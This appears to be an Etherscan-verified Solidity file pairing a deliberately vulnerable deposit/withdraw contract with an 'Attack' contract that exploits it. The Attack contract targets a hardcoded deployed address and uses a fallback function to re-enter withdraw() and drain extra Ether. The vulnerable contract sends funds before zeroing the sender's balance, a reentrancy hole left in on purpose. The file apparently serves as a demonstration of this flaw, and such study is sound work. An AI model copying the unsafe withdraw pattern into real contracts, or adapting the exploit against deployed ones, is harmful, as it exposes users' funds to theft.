/**
 *Submitted for verification at Etherscan.io on 2021-12-02
*/

// SPDX-License-Identifier: WTFPL
pragma solidity ^0.5.0;

// Vulnerable contract source code
contract Vuln {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        // Increment their balance with whatever they pay
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        // Refund their balance
        msg.sender.call.value(balances[msg.sender])("");

        // Set their balance to 0
        balances[msg.sender] = 0;
    }
}

contract Attack {
    uint256 countSteals = 0;

    // address of the deployed vulnerable
    // 0x36A540E3A78084962B75E25877CfACf8846Be018
    Vuln v = Vuln(address(0x36A540E3A78084962B75E25877CfACf8846Be018));

    // function to check my balance
    function getBalance() public returns (uint256) {
        return address(this).balance;
    }

    // fallback function that will call the withdraw 2
    // subsequent two calls made before balance set to 0
    function() external payable {
        if (countSteals < 2) {
            countSteals += 1;
            v.withdraw();
        } else {
            countSteals = 0;
        }
    }

    function attack() public payable {
        // deposit to the vulnerable contract
        v.deposit.value(100 finney)();

        // withdraw from the vulnerable contract
        v.withdraw();
    }
}